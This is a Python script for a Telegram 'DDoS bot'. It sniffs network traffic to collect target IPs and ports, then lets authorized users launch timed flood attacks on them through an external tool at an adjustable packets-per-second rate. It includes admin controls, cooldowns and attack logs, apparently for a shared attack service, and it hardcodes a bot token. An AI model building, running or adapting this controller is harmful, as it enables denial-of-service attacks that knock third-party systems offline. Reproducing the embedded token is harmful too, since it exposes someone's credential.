import sys
import subprocess
import threading
import time
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackContext, CallbackQueryHandler
import pyshark  # Pyshark for packet sniffing

# Global variables
running = False  # Flag to track if an attack is running
cooldown_time = 120  # Global cooldown timer
admins = {}      # Dictionary to store admins and their coins
users = {}       # Dictionary to store users and their access expiry
owner_id = 708030615  # Replace with your Telegram user ID
attack_logs = []  # List to store attack logs
user_activity = {}  # Dictionary to track user activity
cooldown_duration = 120  # Default cooldown duration (5 minutes)
attack_intensity = 3000  # Default attack intensity (packets per second)
detected_ips = {}  # Dictionary to store detected IPs and ports

# Function to check if a user is an admin or the owner
def is_authorized(user_id):
    return user_id == owner_id or user_id in admins

# Function to sniff IP and port using pyshark
def sniff_ips_ports():
    def packet_callback(packet):
        try:
            if 'IP' in packet and 'TCP' in packet:
                ip_dst = packet.ip.dst  # Destination IP
                port_dst = packet.tcp.dstport  # Destination port

                # Store detected IPs and ports
                if ip_dst not in detected_ips:
                    detected_ips[ip_dst] = set()
                detected_ips[ip_dst].add(port_dst)

                print(f"Detected IP: {ip_dst}, Port: {port_dst}")
        except AttributeError:
            pass  # Ignore packets that don't have IP/TCP layers

    # Start sniffing in a separate thread
    capture = pyshark.LiveCapture(interface='eth0')  # Replace 'eth0' with your network interface
    capture.apply_on_packets(packet_callback)

# Start command handler
async def start(update: Update, context: CallbackContext):
    keyboard = [
        [InlineKeyboardButton("Start Attack", callback_data='start_attack')],
        [InlineKeyboardButton("Stop Attack", callback_data='stop_attack')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        "Welcome to NOOB_AM Ddos Bot!\n"
        "Click the buttons below to start or stop an attack.",
        reply_markup=reply_markup
    )

# Button click handler
async def button_click(update: Update, context: CallbackContext):
    query = update.callback_query
    user_id = query.from_user.id

    # Check if the user is authorized
    if not is_authorized(user_id):
        await query.answer("You are not authorized to use this command.")
        return

    # Handle button clicks
    if query.data == 'start_attack':
        await start_attack(query)
    elif query.data == 'stop_attack':
        await stop_attack(query)

# Start attack handler
async def start_attack(query):
    global running, cooldown_time

    if running:
        await query.answer("An attack is already running. Use the Stop button to stop it.")
        return

    # Check global cooldown
    if time.time() < cooldown_time:
        await query.answer(f"Cooldown active. Please wait {int(cooldown_time - time.time())} seconds.")
        return

    # Fetch IP and port from detected_ips (example: use the first detected IP and port)
    if not detected_ips:
        await query.answer("No IPs or ports detected yet. Please wait for pyshark to sniff traffic.")
        return

    target = next(iter(detected_ips))  # Get the first detected IP
    port = next(iter(detected_ips[target]))  # Get the first detected port for the IP
    attack_time = 180  # Fixed attack duration (180 seconds)

    # Start the attack using a powerful tool (e.g., a custom script or DDoS tool)
    running = True
    await query.answer(f"Starting attack on {target}:{port} for {attack_time} seconds...")

    def run_attack():
        global running, cooldown_time
        try:
            # Construct the command to call the powerful tool
            # Example: Using a custom tool called "noobam" (replace with your tool)
            full_command = f"./TEST {target} {port} {attack_time} {attack_intensity}"
            process = subprocess.run(full_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

            # Check if the attack was successful
            if process.returncode == 0:
                response = f"Attack Finished. Target: {target} Port: {port} Time: {attack_time}"
                attack_logs.append(response)
            else:
                response = f"Attack Failed. Error: {process.stderr.decode().strip()}"
                attack_logs.append(response)
        except Exception as e:
            response = f"Error: {e}"
            attack_logs.append(response)
        finally:
            running = False
            cooldown_time = time.time() + cooldown_duration  # Set cooldown
            query.bot.send_message(chat_id=query.message.chat_id, text=response)

    # Run the attack in a separate thread
    threading.Thread(target=run_attack).start()

# Stop attack handler
async def stop_attack(query):
    global running

    if not running:
        await query.answer("No attack is currently running.")
        return

    # Stop the attack
    running = False
    await query.answer("Attack stopped.")

# Status command handler
async def status(update: Update, context: CallbackContext):
    if running:
        await update.message.reply_text("An attack is currently running.")
    else:
        await update.message.reply_text("No attack is currently running.")

    if cooldown_time > time.time():
        await update.message.reply_text(f"Cooldown active. Please wait {int(cooldown_time - time.time())} seconds.")

# List users command handler
async def list_users(update: Update, context: CallbackContext):
    if not users:
        await update.message.reply_text("No users found.")
        return

    user_list = "\n".join([f"User ID: {user_id}, Expiry: {time.ctime(expiry)}" for user_id, expiry in users.items()])
    await update.message.reply_text(f"Users:\n{user_list}")

# Remove user command handler
async def remove_user(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id

    # Only admins can remove users
    if not is_authorized(user_id):
        await update.message.reply_text("You are not authorized to remove users.")
        return

    try:
        target_user_id = int(context.args[0])
        if target_user_id in users:
            del users[target_user_id]
            await update.message.reply_text(f"User {target_user_id} removed.")
        else:
            await update.message.reply_text(f"User {target_user_id} not found.")
    except (IndexError, ValueError):
        await update.message.reply_text("Usage: /removeuser <user_id>")

# Cooldown command handler
async def cooldown(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id

    # Only the owner can set cooldown
    if user_id != owner_id:
        await update.message.reply_text("You are not authorized to set cooldown.")
        return

    try:
        global cooldown_duration
        cooldown_duration = int(context.args[0])
        await update.message.reply_text(f"Cooldown set to {cooldown_duration} seconds.")
    except (IndexError, ValueError):
        await update.message.reply_text("Usage: /cooldown <duration_in_seconds>")

# Help command handler
async def help_command(update: Update, context: CallbackContext):
    help_text = (
        "Available Commands:\n"
        "/start - Start the bot\n"
        "/status - Check bot status\n"
        "/listusers - List all users\n"
        "/removeuser <user_id> - Remove a user\n"
        "/cooldown <duration> - Set cooldown duration (owner only)\n"
        "/help - Display this help message\n"
        "/broadcast <message> - Send a broadcast message (admins only)\n"
        "/logs - View attack logs\n"
        "/restart - Restart the bot (owner only)\n"
        "/activity - View user activity statistics\n"
        "/setintensity <packets_per_second> - Set attack intensity (admins only)"
    )
    await update.message.reply_text(help_text)

# Broadcast command handler
async def broadcast(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id

    # Only admins can broadcast messages
    if not is_authorized(user_id):
        await update.message.reply_text("You are not authorized to broadcast messages.")
        return

    try:
        message = " ".join(context.args)
        if not message:
            await update.message.reply_text("Usage: /broadcast <message>")
            return

        # Send the broadcast message to all users
        for user_id in users:
            await context.bot.send_message(chat_id=user_id, text=f"Broadcast: {message}")
        await update.message.reply_text("Broadcast sent to all users.")
    except Exception as e:
        await update.message.reply_text(f"Error: {e}")

# Logs command handler
async def logs(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id

    # Only admins can view logs
    if not is_authorized(user_id):
        await update.message.reply_text("You are not authorized to view logs.")
        return

    if not attack_logs:
        await update.message.reply_text("No logs found.")
        return

    log_text = "\n".join(attack_logs)
    await update.message.reply_text(f"Attack Logs:\n{log_text}")

# Restart command handler
async def restart(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id

    # Only the owner can restart the bot
    if user_id != owner_id:
        await update.message.reply_text("You are not authorized to restart the bot.")
        return

    await update.message.reply_text("Restarting the bot...")
    sys.exit(0)  # Exit the script to trigger a restart (use a process manager to restart the bot)

# User activity command handler
async def activity(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id

    # Only admins can view activity
    if not is_authorized(user_id):
        await update.message.reply_text("You are not authorized to view activity.")
        return

    if not user_activity:
        await update.message.reply_text("No activity found.")
        return

    activity_text = "\n".join([f"User ID: {user_id}, Attacks: {count}" for user_id, count in user_activity.items()])
    await update.message.reply_text(f"User Activity:\n{activity_text}")

# Set attack intensity command handler
async def set_intensity(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id

    # Only admins can set attack intensity
    if not is_authorized(user_id):
        await update.message.reply_text("You are not authorized to set attack intensity.")
        return

    try:
        global attack_intensity
        attack_intensity = int(context.args[0])
        await update.message.reply_text(f"Attack intensity set to {attack_intensity} packets per second.")
    except (IndexError, ValueError):
        await update.message.reply_text("Usage: /setintensity <packets_per_second>")

# Main function
def main():
    # Replace 'YOUR_BOT_TOKEN' with your actual bot token
    bot_token = "7519734348:AAH6grCtysibCCb62AXxgIx9lydeB9wMHhQ"

    # Set up the bot
    application = Application.builder().token(bot_token).build()

    # Add command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("status", status))
    application.add_handler(CommandHandler("listusers", list_users))
    application.add_handler(CommandHandler("removeuser", remove_user))
    application.add_handler(CommandHandler("cooldown", cooldown))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("broadcast", broadcast))
    application.add_handler(CommandHandler("logs", logs))
    application.add_handler(CommandHandler("restart", restart))
    application.add_handler(CommandHandler("activity", activity))
    application.add_handler(CommandHandler("setintensity", set_intensity))

    # Add button click handler
    application.add_handler(CallbackQueryHandler(button_click))

    # Start pyshark sniffing in a separate thread
    threading.Thread(target=sniff_ips_ports, daemon=True).start()

    # Start the bot
    application.run_polling()

if __name__ == "__main__":
    main()